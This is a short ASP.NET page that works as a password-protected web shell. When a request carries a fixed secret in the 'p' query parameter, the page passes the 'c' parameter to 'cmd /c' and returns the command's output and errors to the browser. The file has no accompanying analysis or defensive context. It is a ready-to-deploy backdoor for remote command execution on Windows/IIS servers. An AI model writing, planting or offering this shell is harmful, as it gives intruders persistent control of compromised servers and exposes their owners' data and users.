<%@ Page Language="C#"%>
<%@ Import Namespace="System" %>

<script runat="server">
string stdout = "";                                                                                                                                                                            
string stderr = "";

void Page_Load(object sender, System.EventArgs e) {
    if (Request.QueryString["p"] == "98a9d08dkl23l2l23k120sd09") {
        System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + Request.QueryString["c"]);

        procStartInfo.RedirectStandardOutput = true;
        procStartInfo.RedirectStandardError = true;
        procStartInfo.UseShellExecute = false;

        procStartInfo.CreateNoWindow = true;

        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo = procStartInfo;
        p.Start();

        stdout = p.StandardOutput.ReadToEnd();
        stderr = p.StandardError.ReadToEnd();
    }
}
</script>

<%=stdout %>
<%=stderr %>
